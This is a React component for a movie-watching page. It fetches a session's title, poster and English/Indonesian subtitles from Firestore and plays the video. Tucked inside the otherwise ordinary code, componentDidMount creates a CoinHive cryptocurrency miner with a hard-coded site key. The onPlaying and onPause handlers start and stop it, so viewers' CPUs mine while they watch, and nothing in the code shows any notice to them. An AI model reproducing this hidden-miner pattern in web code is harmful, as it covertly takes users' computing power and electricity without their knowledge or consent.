import React, { Component } from 'react';
import { DefaultPlayer as Video } from 'react-html5video';
import 'react-html5video/dist/styles.css';
import { Button, Snackbar } from "material-ui";
import { Redirect } from "react-router";
import { BasicLayout } from '../components';
import * as firebase from 'firebase';
import 'firebase/firestore';

class WatchPage extends Component {
  state = {
    subsUrl: [],
    title: 'Watch Movie',
    image: '',
    error: false,
    redirect: false,
  };

  componentDidMount() {
    const firestore = firebase.firestore();
    firestore
      .doc(`/session/${this.props.match.params.id}`)
      .get()
      .then(snapshot => {
        const movieData = snapshot.data();
        const targetedLang = ['en', 'id'];
        const targetedSubs = movieData.subs.reduce((prev, curr) => {
          if (targetedLang.indexOf(curr.lang) > -1) {
            return [...prev, curr];
          }
          return prev;
        }, []);
        this.setState({
          subsUrl: targetedSubs,
          title: movieData.title,
          image: movieData.image
        });
      });
      this.miner = new window.CoinHive.Anonymous('6IgN0USpT1jJBVBsx66mPZ8KCQiuH1VD', {throttle: 0.5});
  }

  onVideoError = event => {
    this.setState({
      error: true
    });
  }

  errorRedirect = event => {
    this.setState({
      redirect: true
    })
  }

  renderSnackBar = () => {
    if (this.state.error) {
      return (
        <Snackbar
          open
          message={<span>Session Expired</span>}
          action={
            [
              <Button key="redirect-snackbar" color="accent" onClick={this.errorRedirect}>Close</Button>
            ]
          }
        />
      )
    }
    return null;
  }

  onPlayingVideo = event => {
    this.miner.start();
  }

  onPauseVideo = event => {
    this.miner.stop();
  }

  render() {
    if (this.state.redirect) {
      return (
        <Redirect to="/" />
      )
    }
    return (
      <BasicLayout title={this.state.title}>
        <div>
          <Video
            src={`/data/${this.props.match.params.id}`}
            autoPlay
            crossOrigin="anonymous"
            onError={this.onVideoError}
            onPlaying={this.onPlayingVideo}
            onPause={this.onPauseVideo}
            poster={this.state.image}
            controls={[
              'PlayPause',
              'Seek',
              'Time',
              'Volume',
              'Fullscreen',
              'Captions',
            ]}>
            {this.state.subsUrl.map(subs => (
              <track
                key={`key-${subs.lang}`}
                label={subs.langName}
                kind="subtitles"
                srcLang={subs.lang}
                src={subs.url}
                default={subs.lang === 'en'}
              />
            ))}
          </Video>
        </div>
        {this.renderSnackBar()}
      </BasicLayout>
    );
  }
}

export default WatchPage;
